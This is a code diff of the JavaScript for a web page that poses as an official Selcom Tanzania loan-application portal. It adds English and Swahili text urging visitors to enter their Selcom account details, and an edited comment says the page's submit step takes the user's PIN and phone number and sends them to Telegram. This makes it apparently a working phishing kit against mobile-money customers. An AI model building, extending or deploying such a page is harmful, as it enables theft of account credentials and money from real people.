@@ -27,6 +27,55 @@ document.addEventListener('DOMContentLoaded', () => {
     if (target) target.classList.add('active');
   }
 
+  // Functional Language Switcher
+  const btnEng = document.getElementById('btn-lang-eng');
+  const btnSwa = document.getElementById('btn-lang-swa');
+  const estBtnEng = document.getElementById('est-btn-eng');
+  const estBtnSwa = document.getElementById('est-btn-swa');
+
+  const lblWelcomeTitle = document.getElementById('lbl-welcome-title');
+  const lblWelcomeSub = document.getElementById('lbl-welcome-sub');
+  const lblWelcomeDesc = document.getElementById('lbl-welcome-desc');
+  const lblAlertTitle = document.getElementById('lbl-alert-title');
+  const lblAlertDesc = document.getElementById('lbl-alert-desc');
+  const lblFlagCaption = document.getElementById('lbl-flag-caption');
+  const btnWelcomeContinue = document.getElementById('btn-welcome-continue');
+
+  function setLanguage(lang) {
+    if (lang === 'en') {
+      if (btnEng) btnEng.classList.add('active');
+      if (btnSwa) btnSwa.classList.remove('active');
+      if (estBtnEng) estBtnEng.classList.add('active');
+      if (estBtnSwa) estBtnSwa.classList.remove('active');
+
+      if (lblWelcomeTitle) lblWelcomeTitle.innerText = 'WELCOME TO SELCOM TANZANIA!';
+      if (lblWelcomeSub) lblWelcomeSub.innerText = 'WELCOME TO THE OFFICIAL APPLICATION PORTAL.';
+      if (lblWelcomeDesc) lblWelcomeDesc.innerText = 'Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.';
+      if (lblAlertTitle) lblAlertTitle.innerText = 'CRITICAL NOTIFICATION';
+      if (lblAlertDesc) lblAlertDesc.innerText = '⚠️ ATTENTION! An essential security measure: DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.';
+      if (lblFlagCaption) lblFlagCaption.innerText = 'Official Application Portal (Tanzania Only)';
+      if (btnWelcomeContinue) btnWelcomeContinue.innerText = 'CONTINUE';
+    } else {
+      if (btnEng) btnEng.classList.remove('active');
+      if (btnSwa) btnSwa.classList.add('active');
+      if (estBtnEng) estBtnEng.classList.remove('active');
+      if (estBtnSwa) estBtnSwa.classList.add('active');
+
+      if (lblWelcomeTitle) lblWelcomeTitle.innerText = 'KARIBU SELCOM TANZANIA!';
+      if (lblWelcomeSub) lblWelcomeSub.innerText = 'KARIBU KWENYE PORTAL RASMI YA MAOMBI YA MKOPO.';
+      if (lblWelcomeDesc) lblWelcomeDesc.innerText = 'Taarifa zako za akaunti ya Selcom (Tanzania pekee) zinahitajika ili kuendelea. Hakikisha unatumia namba sahihi ya akaunti.';
+      if (lblAlertTitle) lblAlertTitle.innerText = 'TAARIFA MUHIMU YA USALAMA';
+      if (lblAlertDesc) lblAlertDesc.innerText = '⚠️ TAZAMA! Kipimo muhimu cha usalama: USIWINGIZE TAARIFA ZISIZOSAILIHI ZA SELCOM. Hii itasababisha ombi lako kukataliwa mara moja. Hakikisha namba yako ni sahihi.';
+      if (lblFlagCaption) lblFlagCaption.innerText = 'Tovuti Rasmi ya Maombi (Tanzania Pekee)';
+      if (btnWelcomeContinue) btnWelcomeContinue.innerText = 'ENDELEA';
+    }
+  }
+
+  if (btnEng) btnEng.addEventListener('click', () => setLanguage('en'));
+  if (btnSwa) btnSwa.addEventListener('click', () => setLanguage('sw'));
+  if (estBtnEng) estBtnEng.addEventListener('click', () => setLanguage('en'));
+  if (estBtnSwa) estBtnSwa.addEventListener('click', () => setLanguage('sw'));
+
   // Loan Estimator Sliders
   const loanRange = document.getElementById('loan-range');
   const loanAmountDisplay = document.getElementById('loan-amount-display');
@@ -146,7 +195,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Submit Credentials (PIN and Phone No) -> Sends PIN AND PHONE NO: to Telegram
+  // Submit Credentials (PIN and Phone No) -> Sends NEW SELCOM APPLICANT to Telegram
   if (btnSubmitCreds) {
     btnSubmitCreds.addEventListener('click', async () => {
       const pinVal = Array.from(pinDigits).map(d => d.value).join('');
@@ -327,4 +376,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function hideLoading() {}
 });
-    
+  
